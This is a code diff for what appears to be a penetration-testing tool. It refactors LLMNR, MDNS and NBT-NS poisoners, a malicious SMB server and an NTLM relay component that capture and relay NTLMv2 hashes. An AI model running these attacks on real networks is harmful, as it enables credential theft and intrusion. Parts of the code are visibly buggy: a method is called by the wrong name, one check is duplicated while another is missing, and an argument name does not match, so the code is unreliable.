@@ -7,7 +7,7 @@ from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
 from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from .Poison import MDNS, LLMNR, NBT_NS
+from .Poison import PoisonLauncher
 from multiprocessing import Process, Manager
 from threading import Thread
 import sys
@@ -32,7 +32,7 @@ class SmbServerAttack(CommandSet):
 
     def __init__(self) -> None:
         super().__init__()
-        self.__mdns_poisoner = None
+        self.__poison_launcher = None
         self.__smbserver = None
         self.__attack = None
         self.__alerts_dictionary = Manager().dict()
@@ -75,7 +75,6 @@ class SmbServerAttack(CommandSet):
     def __async_options(self):
         """[ Configuration in case of an asynchronous attack ]"""
         sys.stdout = open("/dev/null", "w")
-        self.__mdns_poisoner.logger_level = "DEBUG"
         signal.signal(signal.SIGINT, signal.SIG_IGN)
 
     def __display_ntlmv2(self):
@@ -91,16 +90,7 @@ class SmbServerAttack(CommandSet):
 
     def __components_to_launch(self):
         """[ Method to launch the poisoner and malicious smb server ]"""
-        # mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
-        # mdns_thread.daemon = True
-        # mdns_thread.start()
-        #llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
-        #llmnr_thread.daemon = True
-        #llmnr_thread.start()
-        nbt_ns_thread = Thread(target=self.__nbt_ns_poisoner.start_nbt_ns_poisoning)
-        nbt_ns_thread.daemon=True
-        nbt_ns_thread.start()
-
+        self.__poison_launcher.start_poisoners()
         self.__smbserver.start_malicious_smbserver()
 
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
@@ -133,6 +123,17 @@ class SmbServerAttack(CommandSet):
 
         if not args.Asynchronous:
             self.__synchronous_attack()
+    def __poison_configuration(self,args:argparse.Namespace)->dict:
+
+        poison_selector = {"MDNS": 1, "NBT_NS": 1, "LLMNR": 1}
+        if(not args.mdns):
+            poison_selector["MDNS"] = 0
+        if (not args.nbt_ns):
+            poison_selector["NBT_NS"] = 0
+        if (not args.nbt_ns):
+            poison_selector["NBT_NS"] = 0
+        return poison_selector
+
 
     def __creating_components(self, args: argparse.Namespace) -> None:
         """[ Method to create the necessary classes ]
@@ -140,25 +141,15 @@ class SmbServerAttack(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
 
         """
-        self.__mdns_poisoner = MDNS(
+        poison_selector = self.__poison_selector(args)
+        self.__poison_launcher = PoisonLauncher(
             self._cmd.LHOST,
             self._cmd.IPV6,
             self._cmd.MAC_ADDRESS,
             self._cmd.INTERFACE,
             self._cmd.info_logger,
-        )
-        self.__llmnr_poisoner = LLMNR(
-            self._cmd.LHOST,
-            self._cmd.IPV6,
-            self._cmd.MAC_ADDRESS,
-            self._cmd.INTERFACE,
-            self._cmd.info_logger,
-        )
-        self.__nbt_ns_poisoner = NBT_NS(
-            self._cmd.LHOST,
-            self._cmd.MAC_ADDRESS,
-            self._cmd.INTERFACE,
-            self._cmd.info_logger,
+            args.asynchronous,
+            poison_selector,
         )
 
         self.__smbserver = MaliciousSmbServer(
@@ -224,6 +215,24 @@ class SmbServerAttack(CommandSet):
         action="store",
         default=".",
         help="Output of the hashes ntlmv2",
+    )
+    argParser.add_argument(
+        "-L",
+        "--llmnr",
+        action="store_true",
+        help="To not use llmnr poisoning",
+    )
+    argParser.add_argument(
+        "-M",
+        "--MDNS",
+        action="store_true",
+        help="To not use MDNS poisoning",
+    )
+    argParser.add_argument(
+        "-N",
+        "--nbt_ns",
+        action="store_true",
+        help="To notTo not use NBT_NS poisoningg",
     )
 
     @with_argparser(argParser)
@@ -386,17 +395,26 @@ class NtlmRelay(CommandSet):
         self.__checking_asynchronous_options(args)
         self.__checking_proxy_options(args)
 
+    def __start_poisoners(self):
+        """[ Metod to start poisoners ]"""
+        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
+        mdns_thread.daemon = True
+        mdns_thread.start()
+        llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
+        llmnr_thread.daemon = True
+        llmnr_thread.start()
+        nbt_ns_thread = Thread(target=self.__nbt_ns_poisoner.start_nbt_ns_poisoning)
+        nbt_ns_thread.daemon = True
+        nbt_ns_thread.start()
+
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
         """[ Method that check options of the attack and  launch the threads that will control the mdns poisoner and the smb server ]
 
         Args:
             args (argparse.Namespace): [ Arguments passed to the attack ]
         """
-
         self.__checking_attack_options(args)
-        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
-        mdns_thread.daemon = True
-        mdns_thread.start()
+        self.__start_poisoners()
         self.__smb_relay_server.start_smb_relay_server()
 
     def __synchronous_attack(self):
@@ -417,7 +435,6 @@ class NtlmRelay(CommandSet):
         )
         self.__config = NTLMRelayxConfig()
 
-        self.__config.setLootdir("loot")
         self.__config.setMode("RELAY")
         self.__config.target = target
         self.__config.setAttacks(self.__attacks)
